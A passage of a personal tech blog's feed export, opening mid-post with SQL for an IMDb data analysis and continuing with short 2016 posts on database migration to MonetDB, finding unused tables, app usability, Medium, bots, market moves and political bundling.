        <span class="k">substring</span><span class="p">(</span><span class="k">substring</span><span class="p">(</span><span class="n">info</span><span class="p">,</span> <span class="n">locate</span><span class="p">(</span><span class="s1">' '</span><span class="p">,</span> <span class="n">info</span><span class="p">,</span> <span class="mi">5</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">3</span><span class="p">),</span> <span class="mi">1</span><span class="p">,</span> <span class="n">locate</span><span class="p">(</span><span class="s1">'/'</span><span class="p">,</span> <span class="k">substring</span><span class="p">(</span><span class="n">info</span><span class="p">,</span> <span class="n">locate</span><span class="p">(</span><span class="s1">' '</span><span class="p">,</span> <span class="n">info</span><span class="p">,</span> <span class="mi">5</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">3</span><span class="p">))</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="k">as</span> <span class="n">numerator</span><span class="p">,</span>
        <span class="k">substring</span><span class="p">(</span><span class="k">substring</span><span class="p">(</span><span class="n">info</span><span class="p">,</span> <span class="n">locate</span><span class="p">(</span><span class="s1">' '</span><span class="p">,</span> <span class="n">info</span><span class="p">,</span> <span class="mi">5</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">3</span><span class="p">),</span> <span class="n">locate</span><span class="p">(</span><span class="s1">'/'</span><span class="p">,</span> <span class="k">substring</span><span class="p">(</span><span class="n">info</span><span class="p">,</span> <span class="n">locate</span><span class="p">(</span><span class="s1">' '</span><span class="p">,</span> <span class="n">info</span><span class="p">,</span> <span class="mi">5</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">3</span><span class="p">))</span> <span class="o">+</span><span class="mi">1</span> <span class="p">)</span> <span class="k">as</span> <span class="n">denominator</span>
        <span class="k">FROM</span> <span class="n">person_info</span>
        <span class="k">WHERE</span> <span class="n">info_type_id</span> <span class="o">=</span> <span class="mi">22</span>
        <span class="k">AND</span> <span class="n">info</span> <span class="k">not</span> <span class="k">like</span> <span class="s1">'%cm'</span>
        <span class="k">AND</span> <span class="n">info</span> <span class="k">like</span> <span class="s1">'%/%'</span>
        <span class="k">AND</span> <span class="n">info</span> <span class="k">like</span> <span class="s1">'%"%'</span>
    <span class="p">)</span> <span class="k">temp</span><span class="p">;</span></code></pre></figure>

<p>Finally it was time to dive into the data. The first query I decided to write was to look at the average age of actors and actresses by year. Writing the query and doing a quick explain caused me to add a few indices to improve the performance but even then it still took over 20 minutes to execute. Having used Vertica and Redshift in the past I knew a columnar database would help but I wanted to keep it free. This led me to <a href="https://www.monetdb.org/">MonetDB</a>.</p>

<p>Somewhat remarkably, installing and setting up MonetDB was a breeze but I had a two hiccups migrating the data. One was creating the equivalent tables in MonetDB which had a slightly different syntax from MySQL and required a bit of trial and error to work through. The other was the actual export of data from MySQL in a way that was also easy to load into MonetDB. I ended up settling on a CSV export that also took into account the various ways to delimit, escape, and enclose the different fields. After getting the migration to work on one table it was just a series of copy and pastes to get the other tables over.</p>

<figure class="highlight"><pre><code class="language-sql" data-lang="sql"><span class="c1">-- MySQL export</span>
<span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">title</span> <span class="k">into</span> <span class="n">outfile</span> <span class="s1">'/tmp/title.csv'</span> <span class="n">fields</span> <span class="n">terminated</span> <span class="k">by</span> <span class="s1">','</span> <span class="n">enclosed</span> <span class="k">by</span> <span class="s1">'"'</span> <span class="n">escaped</span> <span class="k">by</span> <span class="nv">"</span><span class="se">\\</span><span class="nv">"</span> <span class="n">lines</span> <span class="n">terminated</span> <span class="k">by</span> <span class="s1">'</span><span class="se">\n</span><span class="s1">'</span><span class="p">;</span>

<span class="c1">-- MonetDB import</span>
<span class="k">COPY</span> <span class="k">INTO</span> <span class="n">title</span> <span class="k">from</span> <span class="s1">'/tmp/title.csv'</span> <span class="k">USING</span> <span class="k">DELIMITERS</span> <span class="s1">','</span><span class="p">,</span><span class="s1">'</span><span class="se">\n</span><span class="s1">'</span><span class="p">,</span><span class="s1">'"'</span> <span class="k">NULL</span> <span class="k">AS</span> <span class="s1">'</span><span class="se">\\</span><span class="s1">N'</span><span class="p">;</span></code></pre></figure>

<p>I had no experience with MonetDB and didn’t know what to expect with this entire series of steps being a waste of time. I expected some improvement and it turns out the query that took over 20 minutes to run in MySQL was able to run in just over 30 seconds in MonetDB. I was off to the races. I spent the next bit of time QAing the data and dealing with outliers and edge cases. Some were due to mistakes I made - for example not filtering cast members to only include actors and actresses which manifested itself in an actor that lived to be over 2000 years old. This turned out to be a movie about <a href="http://www.imdb.com/title/tt1560702/">Socrates</a> with one of the writers being Plato. Some simply uncovered weird data - there’s a movie, <a href="http://www.imdb.com/title/tt5174640/">100 Years</a>, which is scheduled to be released in 2115 and led to some old actors and actresses. While others were clearly data mistakes - actors who were born after they died, for example <a href="http://www.imdb.com/name/nm2917761/">Walter Beck</a> who was born in 1988 but passed away in 1964.</p>

<img src="http://dangoldin.com/assets/static/images/100-years.png" alt="100 Years" width="644" height="360" layout="responsive"/>

<img src="http://dangoldin.com/assets/static/images/walter-beck.png" alt="Walter Beck" width="661" height="243" layout="responsive"/>

<p>Dealing with these was an iterative process. I ended up settling on removing all non actors and actresses from the queries as well as limiting my dataset to movies produced between 1920 and 2015 while also eliminating all combinations where a movie was produced before a birth. These edge cases are infrequent enough that they most likely wouldn’t have had any impact on the results but going through this process gives us confidence in what we’re doing. The next step is actually going through the analysis which I hope to finish up tomorrow.</p>

<p>If you’re interested in the code, it’s up on <a href="https://github.com/dangoldin/imdb">GitHub</a>; and if you’re interested in the data contact me and I can share a snapshot of the DigitalOcean instance that contains the data in both MySQL and MonetDB.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Experimenting with Medium</title>
   <link href="http://dangoldin.com/2016/05/15/experimenting-with-medium/"/>
   <updated>2016-05-15T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2016/05/15/experimenting-with-medium</id>
   <content:encoded><![CDATA[
<p>Despite my <a href="http://dangoldin.com/2014/02/02/why-i-manage-my-own-blog/">aversion</a> to walled gardens and platforms I’ve seen a ton of people make the switch to <a href="https://medium.com/">Medium</a>. Within the past month I’ve seen a variety of bloggers move over to Medium, both big and small: <a href="https://bothsidesofthetable.com/finding-a-new-medium-aa0f882815d#.s4y1c45ky">Mark Suster</a>, <a href="http://blog.semilshah.com/2016/04/30/medium-rare/">Semil Shah</a>, <a href="http://thegongshow.tumblr.com/post/143602596745/corporate-governance-dictatorships-vs-democracy">Andrew Parker</a>, and a former coworker, <a href="https://medium.com/@dillonforrest">Dillon Forrest</a>. I’m still not convinced that Medium is for me but it definitely feels as if it’s at that inflection point with more and more people moving to Medium. And from what I’ve heard it does wonders for reach and promotion - something that I’ve been relying on Google search and Twitter for.</p>

<p>To that end I’m going to try an experiment and start publishing on Medium (<a href="https://medium.com/@dangoldin">https://medium.com/@dangoldin</a>) as well as on my primary blog. The goal is to experiment with Medium and see how much engagement it can actually drive. To start I’m going to copy some of my posts over to Medium and see how they fare.</p>

<p>So far, one of the nice things about Medium is that it comes with a simple API that allows you to take either Markdown or a subset of HTML and turn into a Medium post via a quick API call. In fact, earlier today I wrote a <a href="https://github.com/dangoldin/medium-tools">small script</a> that that takes the raw Jekyll markdown and posts it as a draft to Medium. It won’t work on every single post yet but for the ones that are pure markdown it works perfectly (example: the <a href="http://dangoldin.com/2016/05/11/identifying-unused-database-tables/">original</a> vs on <a href="https://medium.com/@dangoldin/identifying-unused-database-tables-f1e969039f6c#.1n6p1g1jw">Medium</a>).</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Expiration date selection design anti pattern</title>
   <link href="http://dangoldin.com/2016/05/14/expiration-date-selection-design-anti-pattern/"/>
   <updated>2016-05-14T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2016/05/14/expiration-date-selection-design-anti-pattern</id>
   <content:encoded><![CDATA[
<div class="right10">
<img src="http://dangoldin.com/assets/static/images/chipotle-app-cc-expiration.png" alt="Chipotle app credit card expiration" width="750" height="1334" layout="responsive"/>
</div>

<p>Wanting to avoid a busy lunch rush but hankering for Chipotle I decided to download their app to order ahead. It’s a straightforward app and everything went as expected until I had to enter the expiration date for my credit card. The way the app is set up is that you’re expected to choose the month first followed by the year. Unfortunately it prevents you from picking a month in the past. One can probably guess what problem this leads to: if the expiration date is in the future but the expiration month is before today’s month the app rejects the month change until you change the year. The screenshot illustrates the design.</p>

<p>I tend to be more passionate about usability issues than most - especially ones that are obviously wrong and trivial to fix. I suspect in this case in the desire to make the user experience better by not allowing a user to select a date in the past it actually had the opposite effect and decreased the usability.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Identifying unused database tables</title>
   <link href="http://dangoldin.com/2016/05/11/identifying-unused-database-tables/"/>
   <updated>2016-05-11T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2016/05/11/identifying-unused-database-tables</id>
   <content:encoded><![CDATA[
<p>When writing code it’s very easy to accumulate deprecated database tables that end up as zombies - they’re still around and may even be populated and used by a variety of side scripts but if they disappeared and the dependent code was removed nothing would be different. In fact you’d have a smaller code base, a smaller database, and would hopefully improve everyone’s productivity a tiny bit.</p>

<p>Dealing with the tables are are still being populated and read requires a bit of investigative work and knowledge of the product since there’s no simple way of identifying them. But there are a simple ways to identify tables that are no longer updated.</p>

<h3 id="1-the-metadata">1. The metadata</h3>
<p>Some databases provide a last updated flag as part of the metadata tables. For example, MySQL contains an update_time field inside the information_schema.tables table for MyISAM tables. Reading the MySQL documentation it also looks as if recent versions will have this set for some InnoDB tables as well.</p>

<h3 id="2-the-temporal-columns">2. The temporal columns</h3>
<p>In the case where there’s no metadata for a table you have to resort to a bit of trickery. If your table has any form of a time column then you can write a very simple query - <strong>select min(timestamp), max(timestamp) from table</strong> - to spot the most recent data in a given table. If this date is old you may be able to safely assume that this table is no longer being populated or maintained. Combining this quick trick with data from the informatino_schema.columns table and you can write a very neat query that can run this check across the entire database.
For example, you can first run <strong>select table_schema, table_name from information_schema.columns where column_name = ‘timestamp’</strong> to identify every table that contains the timestamp column. Then you can automate the creation of a monster query that will generate a checking query for each of the tables and then union them all together. So then you end up with something akin to <strong>select ‘table_1’ as table_name, min(ymd) as min_ymd, max(ymd) as max_ymd from table_1 union all select ‘table_2’ as table_name, min(ymd) as min_ymd, max(ymd) as max_ymd from table_2 union all…</strong> The query may take a while depending on the indices but once it does you can quickly sort by the max timestamp to quickly spot the potentially unused tables.
A small adjustment you can make to deal with tables that may still be getting populated is to look at the number of rows that exist by day. If you see a huge decline it can be a good indicator that this table may just be getting some noise from an older job and is safe to remove, but only after removing the deprecated job.</p>

<h3 id="3-snapshot-and-monitor">3. Snapshot and monitor</h3>
<p>But what do you do if there’s no metadata and no timestamp column? Ideally you’d have created and updated timestamps in every table. If not you can either add these to be automatically set and see whether anything changes over time or you can just take a manual snapshot today and a few days or weeks later to see whether anything changed. If the table is too large you can compare the number of rows or some summary statistics. The general idea is to compare it against multiple periods of time to see if, and how much, it’s changing.</p>

<p>These are just a few tricks I’ve picked up over the years trying to keep database schemas clean. Most companies do a good job managing the deployment process when generating new tables and writing new code but it’s rare to find companies that tend to their database garden. I believe maintaining a clean database is underrated - it’s valuable to know that everything in your database is used and that you don’t have to worry worry about an obscure script touching an obscure table you’ve never heard of. I’d love to know if people have other tips that can be used to both keep, and get, a database clean.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Google's photo search is eerily incredible</title>
   <link href="http://dangoldin.com/2016/05/08/googles-photo-search-is-eerily-incredible/"/>
   <updated>2016-05-08T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2016/05/08/googles-photo-search-is-eerily-incredible</id>
   <content:encoded><![CDATA[
<p>Last Friday, Fred Wilson <a href="http://avc.com/2016/05/feature-friday-photo-search/">wrote a post</a> lauding Google’s photo search. I’ve had the same experiences. In the past couple of months I’ve made numerous searches without expecting a useful result but in nearly every case I was pleasantly surprised. Just in the past week I wanted to search for a short story I wrote while in middle school that I digitized at some point over the past few years. My first attempt was to search for “paper” which got me too many results to parse through. But for my second attempt I tried “essay” and was able to find a photo of one of the hand-written pages. It was simple to look at the date I uploaded that one page to find the others. A couple of days ago I was out of town but needed my passport information to fill out an online government form. Turns out that I have a photo of my passport on my Google account - I backed it up years ago as I was traveling so I had proof in case anything happened to it.</p>

<p>On one hand I’m clearly impressed by how accurate the searches are but does make me worry about how much information we inadvertently share that can be indexed. It’s hugely convenient now but it’s impossible to predict the future and see how it will be used. I wonder how many photos we’re currently sharing that we assume are indiscernible to these automated systems. The vast majority are safe for now but given the pace of technological progress I’ll be shocked if software isn’t more accurate and faster than humans in 20 years. And photos are just a small piece of the puzzle - every bit of digital content we produce will be data mined until it can’t reveal any more. All this will benefit us in the short term but I wonder the world will look like when everything we produce can and will be analyzed and understood by machines.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Text is king</title>
   <link href="http://dangoldin.com/2016/04/30/text-is-king/"/>
   <updated>2016-04-30T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2016/04/30/text-is-king</id>
   <content:encoded><![CDATA[
<p>As many people know despite being bullish on tech I’m spartan and utilitarian with my technology usage. This expresses itself as a strong bias for text above nearly another format. There are tons of apps that try to help me organize my tasks and todos but I prefer simple text files and an intelligent folder structure. This is true when it comes to blogging as well - rather than using a fancy CMS or hosted application I rely on Jekyll which exposes my content in Markdown.</p>

<p>On the surface this seems inefficient - why build your own tools when perfectly good apps exist that will be maintained and improved over time? Unless I spend a ton of time there’s no way I’m going to be able to build a blogging platform that competes with Medium or Wordpress nor will I ever make a to do application that is better than Todoist, Wunderlist, or Google Calendar.</p>

<p>For me it’s less about the tool and more about the problem. Sure, a tool helps with that but I’m more about figuring out a process that works for me. Despite how great an app is it’s extremely unlikely that it will change to accommodate my evolving needs. Having my own process optimized around text gives me the flexibility to do things my way as well as easily change both the process and the underlying data.</p>

<p>Just last week I realized that I forgot to add metadata to a few of my blog posts. Had the content been squirrelled away in a web app there’s no way I would have been able to easily find which posts were affected other than writing a crawler and examining the DOM. But having everything in simple structured Jekyll text files made it as simple as writing a simple command line regular expression to identify these posts. And this can easily scale to any other blog maintenance task I have - whether it’s adding some additional information to a subset of posts or just searching for various words or phrases.</p>

<p>The success of this system depends on building out and committing to a structured approach when dealing with text. Text is innately extremely flexible but by imposing a semi-structured system of tags and folder structures it makes it extremely easy to navigate and manage. And if anything does change it only requires a small script to update everything to fit the new format. Replication is also simple - I can either keep it in a version control system or have it synced via Dropbox. If you’re undisciplined or have a static workflow definitely leverage an existing tool but if you’re constantly trying to improve your system and want the ability to go back and analyze content you produced there’s not much better than text. It unlocks the power of the command line while giving you the option to write whatever esoteric script you need to solve your own problem. And if you do want to export your data anywhere else it can be as simple as turning your simple, semi-structured text into an API request to whatever service is in vogue at the moment.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Avoid full body code transplants</title>
   <link href="http://dangoldin.com/2016/04/27/avoid-full-body-code-transplants/"/>
   <updated>2016-04-27T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2016/04/27/avoid-full-body-code-transplants</id>
   <content:encoded><![CDATA[
<p>When working on new features it’s easy to keep increasing scope until you end up doing a full rewrite of your code. Don’t. It’s healthy to refactor code as you go but you need to be wary of how many things you’re changing and the risks those changes carry. Code will get stale unless it’s constantly maintained and updated as the rest of the product evolves but trying to change too much at once will make it difficult to diagnose issues and increase the odds of bugs in production.</p>

<p>The analogy is that of an extremely sick patient. That person may need a variety of transplants but it’s dangerous and stupid to replace multiple organs at once. Instead you should find the most critical one to replace and do that. After the body adjusts to that transplant you move on to the next most critical one. Otherwise the body will go into shock and reject the organs.</p>

<p>Bad code is similar to this patient. There are countless things that can be improved but if it’s doing a critical job keeping a product alive you need to treat it carefully. Replacing everything at once may end up working but more likely it will cause a slew of problems that will be tough to diagnose given the various changes. It’s much better to approach code like a sick patient - make a change, release, and monitor to make sure everything is going well. Once you’re confident that the code is functioning as expected you can move on to the next most critical item. Over time you end up replacing the critical components while reducing risk.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>A Telegram blog bot</title>
   <link href="http://dangoldin.com/2016/04/23/a-telegram-blog-bot/"/>
   <updated>2016-04-23T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2016/04/23/a-telegram-blog-bot</id>
   <content:encoded><![CDATA[
<p>A combination of bots being in vogue and Telegram offering $1M in <a href="https://telegram.org/blog/botprize">bot prizes</a> got me to spend a little bit of time writing a bot last week. To get my feet wet I created a simple, self-serving bot that would reply with a random blog post when sent a /blogme command. The code itself is extremely straightforward and most of the time was spent going through the Telegram bot docs and getting the deployment and HTTPS setup. A nice feature that Telegram has is the ability to write a bot that can respond to both polling and webhooks. The polling approach is a much trivial to get started with since you don’t need to worry about any of the devops work and can work on the core interaction. The cons are that it won’t respond immediately and you need a way to track messages your bot has already replied to. Changing it to a webhook provided real time responses but made it a bit more difficult to test and wrapping everything inside a minimal web framework. The biggest hiccup was the requirement of HTTPS for a webhook integration but <a href="https://letsencrypt.org/">Let’s Encrypt</a> made it simple to get up and running. A year ago I wouldn’t have bothered prototyping anything that required HTTPS but these days it’s incredibly easy to set up. The <a href="https://github.com/dangoldin/bots">code is up</a> on GitHub and if you’re interested in bots definitely take a look. And if you have Telegram installed try messaging “danblog” with /blogme to get a random blog post.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Irrationality of the markets: Amazon up, Netflix down </title>
   <link href="http://dangoldin.com/2016/04/18/irrationality-of-the-markets-amazon-up-netflix-down/"/>
   <updated>2016-04-18T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2016/04/18/irrationality-of-the-markets-amazon-up-netflix-down</id>
   <content:encoded><![CDATA[
<img src="http://dangoldin.com/assets/static/images/amazon-prime-monthly.png" alt="Amazon monthly pricing" width="938" height="481" layout="responsive"/>

<p>Last night, Amazon <a href="http://www.nytimes.com/2016/04/18/business/amazon-challenges-netflix-by-opening-prime-to-monthly-subscribers.html">announced</a> that in addition to the annual plan they’re going to start offering Prime as a monthly service. Sure enough, investors interpreted this as good move by Amazon (up 1.51% at end of day) while hurting Netflix (down 2.79% at end of day and even more post earnings). These percentages translate into a $1.34B decrease to the Netflix valuation and a $4.49B increase in valuation for Amazon. As a shareholder of both I find this behavior interesting for its irrationality.</p>

<p>Companies are constantly innovating and have a constant stream of ongoing initiatives and experiments. I’m surprised such a simple move can impact the markets so much - it seems like an obvious move that would have happened at some point and should have been baked into the current price. The fact that there was such a sudden stock price move attributed to the news strikes as proof in the irrationality of the markets - trivial decisions shouldn’t be moving the needle and people should be investing in long term plans and visions.</p>

<p>I’m bullish on both and view them both as compelling replacements to cable and legacy TV consumption. Netflix has better content portfolio and is worth the $7.99 I pay each month. Amazon provides some new shows but I’m a Prime member for the free 2 day shipping. I’d love to see the numbers but I suspect there’s a large overlap between households that have Netflix and those that have Prime. The real competition is existing cable networks that are going to get punished as the younger cord-cutter generations move out of their parents’ homes.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>The corporate email signup design pattern</title>
   <link href="http://dangoldin.com/2016/04/13/the-corporate-email-signup-design-pattern/"/>
   <updated>2016-04-13T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2016/04/13/the-corporate-email-signup-design-pattern</id>
   <content:encoded><![CDATA[
<p>One of the latest trends I’ve noticed is B2B companies is allowing you to sign up with a company email address and automatically linking you with the rest of the organization. This is a definite no-brainer and a really simple way of getting new users setup without having to be bottlenecked by a burdensome administrative process. No one on the HR team has to enter employees into the system nor send anyone their username or account info. Instead they just provide a link to the service and have people sign up with their company email address. Once this is done they immediately have access to whatever the base employee account should have. Only later one does an admin need to grant additional permissions and privileges.</p>

<p>The companies off the top of my mind that have done this are <a href="https://slack.com/">Slack</a>, <a href="https://www.greenhouse.io/">Greenhouse</a>, and <a href="https://tallie.com/">Tallie</a> but there are countless others. If you’re building a B2B product that’s designed around teams working together this should be at the top of the product queue. It’s a great way to get on the good side of the HR team while getting your users onboarded quicker.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Unintended consequences</title>
   <link href="http://dangoldin.com/2016/04/10/unintended-consequences/"/>
   <updated>2016-04-10T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2016/04/10/unintended-consequences</id>
   <content:encoded><![CDATA[
<p>Earlier today I read an <a href="http://fusion.net/story/287592/internet-mapping-glitch-kansas-farm/">article about MaxMind</a>, a company that offers an IP address to geographic location mapping service, making a seemingly minor decision in 2002 that that led to unintended consequences that have been going on since then. The article goes into detail about the decision and the effect but the main idea is that it’s not a prefect system and they needed a way to approximate some IP addresses to particular locations. Lo and behold these locations are now seeing tons of harassment from law enforcement and various strangers online.</p>

<p>This is a perfect example of how a quick fix to a seemingly simple problem can lead to a world of problems that can impact others without you even knowing. I can imagine myself running into that problem and making the same decision. It’s unlikely I would have thought about the people that may have lived at those coordinates or that people would actually be using this information to track people down.</p>

<p>There’s a lesson here for everyone who’s writing software: at the end of the day all the code we write will have some effect on people and we need to be mindful of that. We’re not going to stop making mistakes but we should take the time to consider the impact of every line of code we write.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Generalize at n=3</title>
   <link href="http://dangoldin.com/2016/04/07/generalize-at-n3/"/>
   <updated>2016-04-07T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2016/04/07/generalize-at-n3</id>
   <content:encoded><![CDATA[
<p>Engineers strive to write code that’s general and flexible enough to adapt to support a variety of cases with minimal changes. Unfortunately, writing general code isn’t easy and requires significant thought, effort, and experimentation. The challenge is figuring out the appropriate time to generalize your code.</p>

<p>If you do it too early you may spend unnecessary time writing generalized code that will never be used again. Even worse you may write code that you think is generalizable but ends up collapsing under its own weight under future scenarios. In this case writing minimal code would have served you better since it would have been much easier to adapt or throw away to support the new case.</p>

<p>If you do it too late you most likely spent time doing repetitive work that could have been better spent building a scalable solution that you may end up doing anyway.</p>

<p>My rule of thumb is to generalize at n=3. The first two times I have to support a new scenario or process I’ll just do it manually or hacked together. But as soon as I need to do it for the third time I’ll start looking for a more generalized solution. At this point it’s likely that the third is not the last time I’m going to have to do it and I also have 3 cases to base and test my solution on.</p>

<p>This isn’t a trivial approach but works surprisingly well. It’s incredibly difficult to predict whether a simple script will morph into something more or end up being used once. The easiest way to predict whether it will be repetitive is to wait until it is repetitive - for me that magic number is 3. High enough to weed out the edge cases but low enough to get enough value from being generalized.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>The best code is no code</title>
   <link href="http://dangoldin.com/2016/04/05/the-best-code-is-no-code/"/>
   <updated>2016-04-05T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2016/04/05/the-best-code-is-no-code</id>
   <content:encoded><![CDATA[
<p>The best code isn’t code that’s elegant or code that’s brilliant it’s code that doesn’t need to be written. One of the best feelings is when you can take a new problem and turn it into an existing problem that already has a solution. Sometimes that requires making a few tweaks and compromises to the problem or the code but the time and effort saved can be massive. This requires a deep understanding of the problem being solved as well as the existing code. Someone knowing the code but not the problem won’t be able to transform the problem into something applicable. And someone having a deep knowledge of the problem but not the code won’t be able to see how the code can be adapted to solve this scenario. The optimal result comes from someone who can strip away the cruft from both of them while still maintaining the spirit of both in order to combine them.</p>

<p>To make this work you need code that’s clean, well architected, and accessible. Such code is a pleasure to work with and is transparent enough that a decent programmer can see how it can be tweaked to solve new problems that arise. This requires massive amounts of discipline to go back and refactor your code when necessary to keep it in a pristine state so it can be easily transformed when needed. And that transformation with introduce wrinkles that will need to be ironed out to set it up for the next wave of changes.</p>

<p>While writing this post I was reminded of a joke that emphasises this idea of minimizing work by focusing on what you’ve already done:</p>

<blockquote cite="https://www.reddit.com/r/Jokes/comments/36lys2/a_mathematician_was_interviewing_for_a_job/">
<p>A mathematician was interviewing for a job. The interviewer asks him - "You are walking towards your office and running late for a very important meeting and you glimpse a building on fire with people screaming for help. What will you do?". The mathematician thinks for a while and replies : "People's lives are more important than an office meeting. I would immediately call for a fire brigade and help the trapped to the best of my abilities". The interviewer seems to be impressed with the mathematician's answer and moves on to the last question. Just to check his sanity, she asks: "And what if the building is not on fire?"

After a moment of thought, the mathematician replies with confidence: "I will set the building on fire. Now, I have reduced it to a problem that I have already solved before!"</p>

<cite>- <a href="https://www.reddit.com/user/ScottElliot">ScottElliot</a> on <a href="https://www.reddit.com/r/Jokes/comments/36lys2/a_mathematician_was_interviewing_for_a_job/">reddit</a>
</cite>

</blockquote>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Ben Thompson's “laddering up” and building bigger moats</title>
   <link href="http://dangoldin.com/2016/04/03/ben-thompsons-laddering-up-and-building-bigger-moats/"/>
   <updated>2016-04-03T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2016/04/03/ben-thompsons-laddering-up-and-building-bigger-moats</id>
   <content:encoded><![CDATA[
<p>Last weekend I finished the <a href="http://www.amazon.com/The-Everything-Store-Bezos-Amazon-ebook/dp/B00BWQW73E">The Everything Store</a>, which details the rise of Amazon from a fledgling online book retailer to its current form. One pattern that stood out for me was how Amazon was able to continuously push into new business areas due to the infrastructure that they had in place based on previous decisions and commitments.</p>

<p>They started with books but were able to grow into other smaller products once they figured out the logistics behind shipping smaller items. Once Amazon had that in place they kept tweaking their distribution system to expand the variety of products offered while improving the speed of delivery. This allowed them to keep amassing a list of products which they used to open up their platform to third party sellers. And as Amazon improved their infrastructure they were able to open that up to these third party sellers as well. In parallel, they built AWS to provide computer services to internal Amazon teams but were able to turn it into a brand new line of business that powers the majority of new startups. And now their are rumors of Amazon building out a shipping service to bypass FedEx and UPS.</p>

<p>Ben Thompson coined this the “<a href="https://stratechery.com/2016/snapchats-ladder/">ladder-up strategy</a>” and I’d argue it’s the only way companies can keep consistently growing. Relentlessly focusing on a few things and then using them to attack adjacent markets is how you grow from a struggling startup to a powerhouse. The challenge is making the short term decisions that set you up for success in the future as well as knowing when to leverage that infrastructure to move into the next thing. The former is incredibly difficult - it requires thinking beyond the immediate step and understanding the opportunities that become available after a successful execution of the initial step. Then follow up by thinking of what the next strategic step will be and what doors that will open up. After a few iterations of this exercise you may get a glimpse of your company’s future. But the ideas are the easy part - the execution is an order of magnitude more difficult. Scenarios will consistently come up that necessitate changing your approach but each change will pull you further and further away from your initial vision. You then need to either steer the company back towards the original direction or adapt your plan based on these new directions.</p>

<p>It’s incredible seeing this successfully execute though. Companies that are able to do this consistently increase the size of their moat and become nearly impossible to dislodge. Each of their activities complements and reinforces the others which when coupled with their benefits of scale grant them monopoly-like powers.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Unbundling politics</title>
   <link href="http://dangoldin.com/2016/03/27/unbundling-politics/"/>
   <updated>2016-03-27T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2016/03/27/unbundling-politics</id>
   <content:encoded><![CDATA[
<p>Yesterday I made the case that the current political system consists of a <a href="/2016/03/26/political-parties-are-product-bundles/">series of product bundles</a> and I’ve been thinking of ways unbundling would work. And what better way than to look at existing products and industries that have been unbundled.</p>

<p>As numerous people have pointed out, the music industry is a clear example. Initially music was sold on CDs and there was no idea of buying solo songs. But with the launch of the iPod, iTunes, and internet proliferation it became possible to buy individual songs. Lately we’ve been back in the bundling phase with the various monthly music subscription services, such as Spotify and Apple Music.</p>

<p>Music debundling was driven by technological changes. It made no sense to package individual songs for sale when they required physical packaging. But as soon as the majority of households got reasonably fast internet it became possible to start selling individual songs.</p>

<p>But how does this apply to the political system? It’s not really a technology problem. We have the ability to share and disseminate information to anyone with an internet connection. We have the ability to allow everyone to vote through a smartphone. We have the ability for anyone to start a cause and share it with millions of people. Unfortunately, having the ability doesn’t mean much without follow through.</p>

<p>In the case of politics there’s so much entrenchment (think recording studios) that change occurs at a glacial pace. The reason the recording studios signed with Apple was because of the rampant piracy - not due to their desire to improve the consumer experience. We need the political equivalent of piracy to spur this unbundling. Ideally it comes dressed as a white knight ready to save the system but leads to unexpected secondary effects that lead to significant changes in the system.</p>

<p>My gut is that we need a few small changes that open to the door to these unintended effects. Something akin to allowing people to request or report services via an app which leads to people asking what else? That will open the door to voting for issues and politics from our phones and maybe even filing taxes.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Political parties are product bundles</title>
   <link href="http://dangoldin.com/2016/03/26/political-parties-are-product-bundles/"/>
   <updated>2016-03-26T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2016/03/26/political-parties-are-product-bundles</id>
   <content:encoded><![CDATA[
<p>I rarely write about politics but it’s an election year and I had an interesting realization. Political parties are just like product bundles. We each have our own issues and policies we’re passionate about but it’s impossible to find a politician, less a party, that has the same views we do. Instead we have political parties that take a few issues and policies and try to wrap them up in a bundle hoping to appeal to enough people to win an election.</p>

<p>Reading the Wikipedia <a href="https://en.wikipedia.org/wiki/Product_bundling">article for product bundling</a> makes it obvious how closely it fits political parties. From Wikipedia:</p>

<blockquote>
Bundling is most successful when:
<ul>
<li>There are economies of scale in production.</li>
<li>There are economies of scope in distribution.</li>
<li>Marginal costs of bundling are low.</li>
<li>Production set-up costs are high.</li>
<li>Customer acquisition costs are high.</li>
<li>Consumers appreciate the resulting simplification of the purchase decision and benefit from the joint performance of the combined product.</li>
<li>Consumers have heterogeneous demands and such demands for different parts of the bundle product are inversely correlated. For example, assume consumer A values word processor at $100 and spreadsheet processor at $60, while consumer B values word processor at $60 and spreadsheet at $100. Seller can generate maximum revenue of only $240 by setting $60 price for each product—both consumers will buy both products. Revenue cannot be increased without bundling because as seller increases the price above $60 for one of the goods, one of the consumers will refuse to buy it. With bundling, seller can generate revenue of $320 by bundling the products together and selling the bundle at $160.</li>
</ul>
</blockquote>

